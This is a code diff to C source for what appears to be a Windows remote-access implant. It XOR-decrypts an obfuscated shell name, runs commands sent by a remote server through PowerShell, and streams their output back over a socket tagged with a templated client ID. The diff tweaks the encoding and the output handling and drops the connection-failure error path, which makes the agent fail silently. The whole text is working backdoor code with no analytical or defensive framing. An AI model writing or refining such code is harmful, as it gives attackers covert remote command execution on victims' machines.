@@ -50,7 +50,7 @@ void execute_command(SOCKET sock, const char* cmdID, const char* command) {
     xor_decrypt(var0, my_strlen(var0), 0xE2);
     
     // chcp 65001 InputEncoding and OutputEncoding in UTF8
-    snprintf(cmdLine, sizeof(cmdLine), "%s -Command  \"%s\"", var0, command);
+    snprintf(cmdLine, sizeof(cmdLine), "%s -Command \"chcp 65001; %s\"", var0, command);
 
     BOOL success = CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CRE_N_WIN, NULL, NULL, &si, &pi);
     CloseHandle(hWrite);
@@ -72,45 +72,44 @@ void execute_command(SOCKET sock, const char* cmdID, const char* command) {
     size_t lineLen = 0;
     
     while (GetTickCount() - startTime < TIMEOUT_MS) {
-        if (PeekNamedPipe(hRead, NULL, 0, NULL, &bytesRead, NULL) && bytesRead > 0) {
+        
+        if (ReadFile(hRead, buffer, BUFFER_SIZE, &bytesRead, NULL) && bytesRead > 0) {
+            buffer[bytesRead] = '\0';
 
-            if (ReadFile(hRead, buffer, BUFFER_SIZE, &bytesRead, NULL) && bytesRead > 0) {
-                buffer[bytesRead] = '\0';
+            // Stack in buffer line
+            memcpy(lineBuf + lineLen, buffer, bytesRead);
+            lineLen += bytesRead;
+            lineBuf[lineLen] = '\0';
 
-                // Stack in buffer line
-                memcpy(lineBuf + lineLen, buffer, bytesRead);
-                lineLen += bytesRead;
-                lineBuf[lineLen] = '\0';
-
-                // Replace \r\n by \n to simplify
-                for (size_t i = 0; i < lineLen; i++) {
-                    if (lineBuf[i] == '\r') lineBuf[i] = '\n';
-                }
-
-                // Process line by line
-                char* lineStart = buffer;
-                char* newline;
-
-                while ((newline = strchr(lineStart, '\n')) != NULL) {
-                    *newline = '\0';
-
-                    // ignore empty lines
-                    if (strlen(lineStart) > 0 && strspn(lineStart, " \r") != strlen(lineStart)) {
-                        char outLine[BUFFER_SIZE * 2];
-                        snprintf(outLine, sizeof(outLine), "OUT:%s:%s\n", cmdID, lineStart);
-                        send(sock, outLine, strlen(outLine), 0);
-                    }
-
-                    lineStart = newline + 1;
-                }
-
-                // if remainder (when no newline at end)
-                lineLen = strlen(lineStart);
-                memmove(lineBuf, lineStart, lineLen);
-                lineBuf[lineLen] = '\0';
-
-                startTime = GetTickCount();          
+            // Replace \r\n by \n to simplify
+            for (size_t i = 0; i<lineLen; i++){
+                if (lineBuf[i] == '\r') lineBuf[i] = '\n';
             }
+
+            // Process line by line
+            char* lineStart = buffer;
+            char* newline;
+
+            while ((newline = strchr(lineStart, '\n')) != NULL) {
+                *newline = '\0';
+
+                // ignore empty lines
+                if (strlen(lineStart) > 0 && strspn(lineStart, " \r") != strlen(lineStart)) {
+                    char outLine[BUFFER_SIZE * 2];
+                    snprintf(outLine, sizeof(outLine), "OUT:%s:%s\n", cmdID, lineStart);
+                    send(sock, outLine, strlen(outLine), 0);
+                }
+
+                lineStart = newline + 1;
+            }
+
+            // if remainder (when no newline at end)
+            if (strlen(lineStart) > 0 && strspn(lineStart, " \r") != strlen(lineStart)) {
+                char outLine[BUFFER_SIZE * 2];
+                snprintf(outLine, sizeof(outLine), "OUT:%s:%s\n", cmdID, lineStart);
+                send(sock, outLine, strlen(outLine), 0);
+                startTime = GetTickCount(); // Reset timer on activity
+            }          
         }
 
         GetExitCodeProcess(pi.hProcess, &exitCode);
@@ -158,12 +157,7 @@ int main() {
     server.sin_family = AF_INET;
     server.sin_port = htons(SERVER_PORT);
 
-    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
-        printf("Connection failed: %d\n", WSAGetLastError());
-        closesocket(sock);
-        WSACleanup();
-        return 1;
-    }
+    connect(sock, (struct sockaddr*)&server, sizeof(server));
 
     // ID du client
     char* clientID = "{{.ID}}\n";
